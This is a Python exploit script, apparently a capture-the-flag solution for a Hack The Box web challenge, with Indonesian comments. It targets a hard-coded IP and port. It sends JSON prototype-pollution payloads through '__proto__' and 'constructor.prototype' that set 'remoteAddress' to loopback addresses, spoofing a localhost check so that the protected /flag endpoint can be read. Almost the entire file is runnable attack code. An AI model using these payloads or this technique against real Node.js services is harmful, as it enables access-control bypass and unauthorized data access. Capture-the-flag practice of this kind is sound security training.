import requests

TARGET_URL = "http://94.237.121.111:56508"

def solve():
    session = requests.Session()
    print(f"[*] Menyerang Target: {TARGET_URL}")

    # 1. Tahap 1: Buat Note
    r = session.post(f"{TARGET_URL}/create", json={"title": "x", "content": "x"})
    note_id = r.json().get("_id")
    print(f"[+] Note ID: {note_id}")

    # 2. Tahap 2: Omega Pollution Payload
    # Kita targetkan 'remoteAddress' tapi kita bungkus di dalam properti 'connection' 
    # agar saat req.connection.remoteAddress dipanggil, dia nyari ke prototipe kita.
    print("[*] Tahap 2: Injeksi polusi loopback (IPv4 & IPv6)...")
    
    # Kita coba kirim dua variasi IP loopback yang paling mungkin
    payloads = [
        {
            "noteId": note_id,
            "__proto__": {
                "remoteAddress": "::ffff:127.0.0.1",
                "connection": {"remoteAddress": "::ffff:127.0.0.1"}
            }
        },
        {
            "noteId": note_id,
            "__proto__": {
                "remoteAddress": "127.0.0.1",
                "connection": {"remoteAddress": "127.0.0.1"}
            }
        }
    ]

    for p in payloads:
        session.post(f"{TARGET_URL}/update", json=p)

    # 3. Tahap 3: Knocking the door!
    print("[*] Tahap 3: Mengetuk dari 'dalam' (GET /flag)...")
    r = session.get(f"{TARGET_URL}/flag")

    if "HTB{" in r.text:
        print(f"\n[!] BOOM! FLAG DITEMUKAN: {r.text}")
    else:
        # Teknik terakhir: Polusi constructor langsung
        print("[*] Percobaan terakhir: Polusi via constructor.prototype...")
        session.post(f"{TARGET_URL}/update", json={
            "noteId": note_id,
            "constructor": {
                "prototype": {
                    "connection": {"remoteAddress": "127.0.0.1"},
                    "remoteAddress": "127.0.0.1"
                }
            }
        })
        r = session.get(f"{TARGET_URL}/flag")
        if "HTB{" in r.text:
            print(f"\n[!] BOOM! FLAG DITEMUKAN: {r.text}")
        else:
            print(f"[-] Gagal. Response: {r.text}")

if __name__ == "__main__":
    solve()
